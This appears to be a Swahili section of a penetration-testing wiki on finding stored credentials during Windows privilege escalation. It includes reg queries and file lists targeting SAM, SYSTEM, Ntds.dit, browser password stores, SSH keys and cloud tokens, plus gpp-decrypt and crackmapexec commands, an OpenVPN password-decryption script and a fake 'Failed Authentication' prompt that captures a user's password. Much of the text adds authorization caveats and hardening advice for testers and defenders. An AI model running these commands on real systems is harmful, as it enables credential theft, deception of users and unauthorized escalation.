Baadhi ya usakinishaji wa zamani wa remote-support huhifadhi majina ya value yanayohusiana na password chini ya fixed application registry keys. Kwa mfano, `SecurityPasswordAES` ya TeamViewer ilitambulisha static session password iliyosanidiwa katika matoleo ya kabla ya 9, kulingana na [maelezo ya vendor kuhusu registry key](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Kiashiria cha jina la value ni mwongozo wa ukaguzi tu: thibitisha version iliyosakinishwa, data ya value inayosomeka, format na tabia ya sasa ya authentication kabla ya kutathmini credential hiyo. Kuhama kutoka password ya remote-support hadi Windows account yenye privileges za juu zaidi kunahitaji pia kuthibitisha matumizi tena ya password hiyo na ruhusa kwa account hiyo. Usijumuishe ciphertext au password zilizopatikana katika matokeo ya kawaida ya enumeration.

### Lahajedwali zilizoshirikiwa zenye sheets zilizolindwa

Ikiwa unashuku kuwa workbook inayoweza kusomwa na kushirikiwa ina data ya account, tofautisha **usimbaji fiche wa faili** na ulinzi wa worksheet au columns zilizofichwa. [Microsoft inasema](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) kuwa ulinzi wa worksheet hudhibiti uhariri na si kipengele cha usalama; peke yake haithibitishi kuwa yaliyomo kwenye workbook yamesimbwa kwa njia fiche. Kagua faili husika tu ambazo umeidhinishwa kufikia, na epuka kuchapisha secrets zinazoweza kuwepo wakati wa enumeration pana. Njia ya `.xlsx` inayosomeka, sheet iliyolindwa au column iliyofichwa pekee havithibitishi kuwa kuna credentials au kwamba account yoyote ina privileges za juu zaidi; thibitisha data halisi na haki za sasa za account kando.

### Patches za mabadiliko zilizohifadhiwa na CI server

CI server inaweza kuhifadhi mabadiliko ya source code yaliyowasilishwa kwenye data directory yake hata baada ya build kukamilika. [TeamCity inaeleza](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) kuwa `system/changes` huhifadhi mabadiliko ya remote-run; data directory inaweza kusanidiwa na si lazima iwe chini ya `ProgramData`. Patch inayosomeka inaweza kuhifadhi marejeleo yaliyoondolewa au kuongezwa kuhusu faili ya credential, encryption key au script inayotumia vyote viwili. Kwa mfano, workflow ya PowerShell `ConvertTo-SecureString -Key` inahitaji AES key pamoja na string iliyosimbwa kwa njia fiche; [Microsoft inaeleza](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) kuwa key hutolewa kando. Kagua majina ya patch zinazoweza kufikiwa kwanza, kisha kagua maudhui husika kwa idhini bila kuchapisha secrets katika matokeo ya kawaida ya enumeration. Njia ya patch, value iliyosimbwa kwa njia fiche au rejeleo la key pekee havithibitishi credential halali au ufikiaji wa privileges za juu zaidi. Zuia ACL za data directory na epuka kuweka secrets kwenye mabadiliko ya build.

### Mzunguko maalum wa kubadilisha password ya local administrator

Password rotator iliyotengenezwa ndani inaweza kuhifadhi password iliyosimbwa kwa njia fiche ya local administrator kwenye local service huku ikiweka datastore credentials zake kwenye `.env` file inayosomeka au karibu na binary ya updater. Kagua scheduled task ya updater, account, ACL za configuration, listener na ruhusa za datastore kwa pamoja. Datastore inayosikiliza loopback pekee bado inaweza kufikiwa na local user mwenye credentials halali, lakini authentication pekee haithibitishi ruhusa ya kusoma records husika. Ikiwa encryption seed au key material inapatikana karibu na ciphertext, kagua key derivation halisi kabla ya kuamini usimbaji fiche huo. Mbinu inayotokana na seed iliyofichuka ili kubaini AES key kwa njia ya deterministic kwa kutumia Go [`math/rand`](https://pkg.go.dev/math/rand) haifai kulinda password hiyo; Go inaeleza kuwa package hiyo haifai kwa randomness nyeti kwa usalama. Thibitisha kuwa password yoyote iliyopatikana bado ni halali na ni ya account iliyo kwenye kundi la local Administrators kabla ya kuichukulia kama njia ya escalation. Scheduled task, njia ya `.env` au encrypted blob pekee havithibitishi hali hizo. Usijumuishe password au key material katika matokeo ya kawaida ya enumeration.

Tumia [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kudhibiti password za local administrator. Hifadhi yake inayoungwa mkono na directory au Entra na vidhibiti vya ufikiaji ni tofauti na custom local datastore; vivyo hivyo, [roles za Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) huamua kama mtumiaji aliyejithibitisha wa datastore anaweza kusoma index mahususi.

### Java server plugin archives na matumizi tena ya credentials

Baadhi ya Java server plugins husambazwa kama JAR archives kwenye directory ya `plugins` ya server. Custom plugin inayosomeka inaweza kuwa na configuration au bytecode yenye service credential iliyopachikwa. Kagua archive hiyo tu ikiwa umeidhinishwa, na usijumuishe secrets zilizopatikana katika matokeo ya kawaida ya enumeration. Njia ya plugin pekee haithibitishi kuwa kuna secret, na service password iliyopatikana husababisha privileges za juu zaidi tu ikiwa ni halali pia kwa account yenye privileges za juu zaidi. Kagua ACL za faili husika na ubadilishe credentials zilizotumiwa tena kwa secrets tofauti. Tazama [mwongozo wa usakinishaji wa plugin wa PaperMC](https://docs.papermc.io/paper/adding-plugins/) kwa muundo wa directory na [nyaraka za JAR za Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) kwa maudhui ya archive.

### Credentials za embedded database ya Openfire

Usakinishaji wa Openfire unaotumia embedded database unaweza kuhifadhi `openfire.script` chini ya `Openfire\embedded-db`. Ikiwa account ya sasa inaweza kuisoma, kagua rekodi za `OFUSER` na property ya `passwordKey` kwa pamoja. [Nyaraka za user-provider za Openfire](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) zinasema kuwa passwords zinaweza kuhifadhiwa kama plain text au kusimbwa kwa njia fiche kwa key iliyohifadhiwa kwenye property hiyo. Password iliyopatikana ni muhimu kwa escalation tu ikiwa bado ni halali kwa identity yenye privileges za juu zaidi; jina la faili pekee halithibitishi ufikiaji wa kusoma wala matumizi tena ya credential. Njia hiyo ni kidokezo cha inventory, kwa hiyo usijumuishe maudhui ya database au credentials katika matokeo ya kawaida ya enumeration.

Faili tofauti ya `Openfire\conf\openfire.xml` inaweza kuonyesha ports na bind interface zilizosanidiwa za admin console hata kama database ya nje inatumika. Kwa kawaida Openfire hufunga admin console kwenye loopback; hata hivyo, local account bado inaweza kufikia anwani hiyo ikiwa listener inaendeshwa. Kagua listener halisi, admin role iliyoidhinishwa, policy ya kupakia plugin na identity ya Openfire service kwa pamoja. Admin anayeweza kusakinisha plugin anaweza kusababisha plugin code kuendeshwa katika context ya service, ambayo inaweza kuwa na privileges nyingi ikiwa service inaendeshwa kama LocalSystem. Password ya account inayolingana au njia ya configuration inayosomeka pekee haithibitishi ufikiaji wa admin console au utekelezaji wa code. Tazama [mwongozo wa vendor wa usakinishaji na usimamizi wa plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) na [property ya API ya kupakia plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Configuration ya forensic management server

Configuration za Velociraptor server, ambazo kwa kawaida huitwa `server.config.yaml`, zinaweza kuwa na `CA.private_key` ya internal CA. Ikiwa mtumiaji mwenye privileges za chini anaweza kusoma key hiyo, anaweza kutoa API client certificate. Ikiwa hili litasababisha privileges za juu zaidi hutegemea user roles za server, ufikikaji wa API na identity ambayo server au target agent inaendeshwa nayo. Client configuration huwa na material tofauti; kuipata hakuthibitishi ufikiaji wa server CA. Baadhi ya deployments huhifadhi CA private key offline, kwa hiyo server configuration inayosomeka inaweza pia kukosa signing key.

Kwenye Windows server, kagua ACL ya **server** configuration kwenye installation directory yake na nakala zozote za backup zilizolindwa. Eneo moja linalowezekana ni `%ProgramFiles%\VelociraptorServer\server.config.yaml`; tumia njia iliyosanidiwa ya service ikiwa ni tofauti. Thibitisha kuwa identity ya sasa inaweza kusoma faili na kwamba `CA.private_key` ipo kweli. Epuka kuchapisha private key kwenye logs au matokeo ya enumeration. Workflow ya vendor ya `config api_client` hutumia CA key kutoa client certificate, lakini server-side role yenye mamlaka pia inahitajika; kuunda au kubadilisha role kunaweza kuhitaji datastore write access au restart. Identity ya server iliyopo yenye privileges inaweza kutoa njia hata kama ruhusa hizo za kuandika hazipo. API queries zenye execution rights huendeshwa katika context husika ya server au agent, ambayo inaweza kuwa na privileges nyingi.

Linda server configuration na backups kwa ACL zenye vizuizi, hifadhi CA signing key offline inapowezekana, na punguza API roles na ufikiaji wa listener. Tazama [nyaraka za API za Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) na [mwongozo wa usanidi wa usalama](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ni session manager tofauti. Hifadhi yake ya asili iliyosimbwa kwa njia fiche inaweza kuwa kwenye `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, ilhali nakala rudufu ya session iliyohamishwa inaweza kuitwa `sessions-backup.dat` na kuhifadhiwa kwingine. [Mwongozo wa kuhamisha wa SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) unasema kuwa faili zinazohamishwa husimbwa kwa nenosiri na zinaweza kuwa na sessions, keys, scripts, tags na mahusiano; [jukwaa lake la usaidizi](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) linabainisha hifadhi ya asili. Kagua ruhusa za faili na njia kwanza. Kupata mojawapo ya faili hizi hakufichui nenosiri lake wala kuthibitisha kwamba credential yoyote iliyohifadhiwa bado ni halali au ina privileges za juu zaidi.

### Putty SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Funguo za SSH kwenye registry

Funguo za faragha za SSH zinaweza kuhifadhiwa ndani ya ufunguo wa registry `HKCU\Software\OpenSSH\Agent\Keys`, kwa hiyo unapaswa kuangalia kama kuna chochote cha kuvutia humo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ukipata ingizo lolote ndani ya njia hiyo, huenda likawa ufunguo wa SSH uliohifadhiwa. Umehifadhiwa kwa njia fiche lakini unaweza kufumbuliwa kwa urahisi ukitumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maelezo zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ikiwa huduma ya `ssh-agent` haifanyi kazi na ungependa ianze kiotomatiki wakati wa kuwasha mfumo, endesha:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Inaonekana kuwa mbinu hii haifanyi kazi tena. Nilijaribu kuunda baadhi ya funguo za ssh, kuziongeza kwa `ssh-add` na kuingia kwenye mashine kupitia ssh. Usajili wa HKCU\Software\OpenSSH\Agent\Keys haupo, na procmon haikubaini matumizi ya `dpapi.dll` wakati wa uthibitishaji wa funguo zisizolingana.

### Faili zisizohudumiwa

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Maudhui ya mfano:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Nakala rudufu za SAM na SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Faili za backup za Windows Imaging (`.wim`) zinazosomeka zinaweza pia kuwa na registry hives za `SAM`, `SECURITY`, na `SYSTEM` za offline. Tanguliza kuangalia folda za backup au image zinazoweza kufikiwa ndani ya mashine, na kagua **majina ya faili zilizomo** kwenye image kabla ya kutoa chochote; jina la faili la `.wim` pekee halithibitishi kuwa hives zimefichuliwa, na image za kawaida za `install.wim`, `boot.wim`, na recovery mara nyingi hupotosha. SMB share ni njia tofauti ya ufikiaji, na inapaswa kukaguliwa tu ikiwa share hiyo iko ndani ya upeo wa kazi. Angalia mwongozo wa Microsoft kuhusu [image za Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) na [marejeleo ya faili za registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Sifa za Cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Tafuta faili inayoitwa **SiteList.xml**

### Nenosiri la GPP Lililohifadhiwa kwenye Kache

Hapo awali kulikuwa na kipengele kilichowezesha kutekeleza akaunti maalum za msimamizi wa ndani kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, njia hii ilikuwa na dosari kubwa za usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML katika SYSVOL, ziliweza kufikiwa na mtumiaji yeyote wa kikoa. Pili, manenosiri ndani ya GPP hizi, yaliyosimbwa kwa AES256 kwa kutumia ufunguo chaguomsingi uliokuwa umewekwa wazi, yangeweza kufumbuliwa na mtumiaji yeyote aliyeidhinishwa. Hili lilileta hatari kubwa, kwani lingeweza kuwawezesha watumiaji kupata mamlaka yaliyoinuliwa.

Ili kupunguza hatari hii, ilitengenezwa kazi ya kuchanganua faili za GPP zilizohifadhiwa kwenye kache ya ndani na zilizo na sehemu ya "cpassword" isiyo tupu. Baada ya kupata faili kama hiyo, kazi hiyo hufumbua nenosiri na kurejesha objekti maalum ya PowerShell. Objekti hii inajumuisha maelezo kuhusu GPP na mahali faili ilipo, hivyo kusaidia kutambua na kurekebisha hatari hii ya usalama.

Tafuta faili hizi katika `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Kufumbua cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Kutumia crackmapexec kupata nywila:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Mfano wa web.config yenye credentials:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Majalada ya hifadhi rudufu kwenye webroot ya IIS

Hifadhi rudufu ya zamani ya ZIP iliyowekwa moja kwa moja kwenye webroot inayohudumiwa inaweza kufichua faili za awali za usanidi na vitambulisho vya kuingia vinavyoweza kutumika tena. Kagua njia halisi iliyosanidiwa ya tovuti na kama jalada hilo linaweza kufikiwa kupitia HTTP kabla ya kulichukulia kama ufichuzi. Njia chaguomsingi `C:\inetpub\wwwroot` ni mahali pa kuanzia tu. Orodha ya haraka ya faili za ndani inaweza kuonyesha majina na ukubwa bila kufungua majalada:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Jina la archive halithibitishi kuwa ina siri au kwamba credential iliyopatikana inatoa privilege ya juu.

### OpenVPN credentials

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Kumbukumbu

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Omba credentials

Unaweza kila wakati **kumwomba mtumiaji aingize credentials zake au hata credentials za mtumiaji mwingine** ikiwa unadhani anaweza kuzijua (kumbuka kwamba **kumwomba** mteja moja kwa moja **credentials** ni **hatari** sana):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Majina ya faili yanayoweza kuwa na credentials**

Faili zinazojulikana kuwa ziliwahi kuwa na **nywila** katika **maandishi wazi** au **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Toleo la orodha ya majina ya faili bila kiendelezi cha Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Hifadhidata za Password Safe v3 kwa kawaida hutumia kiendelezi `.psafe3`. Chukulia jina la faili linalolingana kama uwezekano wa vault iliyosimbwa; kuwepo kwake hakuthibitishi kwamba unaweza kuisoma, kuifungua, au kutumia credentials zozote zilizohifadhiwa. Kagua profaili za watumiaji zinazofikika na mizizi iliyosanidiwa ya kushiriki faili unapochunguza mahali faili hizo zimehifadhiwa.

Faili ya KeePass `.kdbx` inayosomeka vilevile ni kidokezo tu cha vault iliyosimbwa. Kuifungua kunahitaji master-password halisi na pia key-file au vipengele vya akaunti vilivyosaniwa. Ikiwa ukaguzi ulioidhinishwa utapata jozi ya LM:NT hash kwenye ingizo, thibitisha akaunti iliyotajwa na kama NT hash bado ni ya sasa na inakubaliwa na huduma ya NTLM ya lengwa kabla ya kuzingatia [pass-the-hash](../ntlm/README.md#pass-the-hash). Ingizo la vault peke yake halitoi haki za Administrator au SYSTEM; ufikiaji wa huduma ya mbali, haki za akaunti, na hatua yoyote tofauti ya kutekeleza huduma lazima pia viwepo. Orodha ya mali inapaswa kuripoti njia ya vault na kama inasomeka, wala isichapishe hifadhidata au credentials zilizohifadhiwa.

Tafuta faili zote zilizopendekezwa:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Lahaja ya amri ya kutafuta bila kiendelezi cha Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Vitambulisho kwenye Recycle Bin

Unapaswa pia kuangalia Recycle Bin kutafuta vitambulisho vilivyomo

Kagua vipengee vilivyofutwa kwenye Recycle Bin unavyoweza kufikia, ukitafuta nakala rudufu zilizofutwa na kumbukumbu za usanidi, pamoja na faili ambazo majina yake yanataja wazi vitambulisho. Nakala rudufu ya `.7z`, `.zip`, au `.rar` yenye manufaa inaweza kuwa na miezi kadhaa na kuwa na jina la kawaida. Windows huhifadhi njia ya awali na muda wa kufutwa kwenye rekodi ya `$I`, na faili iliyofutwa kama ingizo lake la `$R` linalolingana; kagua metadata na ruhusa ya utambulisho wa sasa ya kusoma kabla ya kufungua kumbukumbu. Uonekano hutegemea volume, SID ya mtumiaji, na ruhusa za faili, kwa hivyo orodha tupu haithibitishi kuwa hakuna nakala rudufu inayoweza kurejeshwa. Chukulia jina la kumbukumbu kama kitu kinachostahili kukaguliwa, si uthibitisho kwamba lina siri halali.

Faili ya `.pfx` iliyofutwa unayoweza kufikia inaweza pia kuwa kidokezo cha **code-signing**. Ikiwa ina private key unayoweza kufikia, key hiyo inaweza kutia sahihi script ya PowerShell iliyobadilishwa; [PowerShell requires a code-signing certificate with a private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), na [AppLocker publisher rules evaluate the signer's identity and rule scope](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Utekelezaji kati ya akaunti unahitaji utambulisho wa sasa uweze kurekebisha script husika, rule inayotumika ikubali saini inayotokana nayo kwa script na akaunti lengwa, na scheduled task au programu nyingine yenye mamlaka ya juu zaidi iendeshe script hiyo. Jina la faili la `.pfx`, subject ya cheti, au script inayoweza kuandikwa pekee havithibitishi mlolongo huo. Kagua metadata, ACLs, sera na amri ya scheduled task kabla ya kufungua private-key material au kuanzisha task.

Pia kagua hifadhidata za profaili za messaging client, notes na faili zilizopokewa unazoweza kufikia ili kutafuta vidokezo vya vitambulisho. Export ya BitLocker recovery inaweza kuhifadhiwa kama HTML au TXT, wakati mwingine ndani ya kumbukumbu ya nakala rudufu yenye jina. Nyenzo kama hizo zinaweza kutoa ufikiaji wa volume tofauti ya data iliyosimbwa kwa njia fiche, iliyo na nakala rudufu za zamani; kagua volume na kumbukumbu hiyo tu ikiwa unaidhinishwa. Ikiwa nakala rudufu ina `NTDS.dit`, urejeshaji wa offline wa vitambulisho vya domain pia unahitaji hive ya `SYSTEM` inayolingana, kama ilivyoelezwa kwenye [backup and privileged-groups workflow](../active-directory-methodology/privileged-groups-and-token-privileges.md). Majina ya faili na volume iliyofungwa pekee havithibitishi kuwa kuna recovery key inayoweza kutumika au nakala rudufu ya domain.

Ili **kurejesha nywila** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Keys nyingine za registry zinazoweza kuwa na vitambulisho**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Toa openssh keys kutoka kwenye registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia ya Vivinjari

Unapaswa kuangalia dbs ambako passwords za **Chrome au Firefox** zimehifadhiwa.\
Unapaswa kuangalia dbs ambako passwords za **Chrome, Edge, au Firefox** zimehifadhiwa.\
Pia angalia historia, bookmarks na favourites za vivinjari ili kuona kama **passwords zimehifadhiwa** humo.

Kwa profile ya kawaida ya Edge ya mtumiaji wa sasa inayoitwa **Default**, `Login Data` iko chini ya `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, huku `Local State` ikiwa kwenye saraka yake mama ya `User Data`. [Microsoft inaandika kuhusu eneo chaguomsingi la profile](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); profile nyingine au sera ya `UserDataDir` inaweza kuihamisha. Kuwepo kwa faili ni dalili tu ya mahali pa kuhifadhi credentials: thibitisha kwamba faili zinaweza kusomwa, kwamba kuna muktadha wa DPAPI wa mtumiaji husika au key material nyingine iliyoidhinishwa, na kwamba login iliyohifadhiwa ni ya akaunti yenye privileges za juu zaidi. Kuhesabu paths pekee hakuhitaji kufungua database au kuchapisha passwords zilizodecryptiwa.

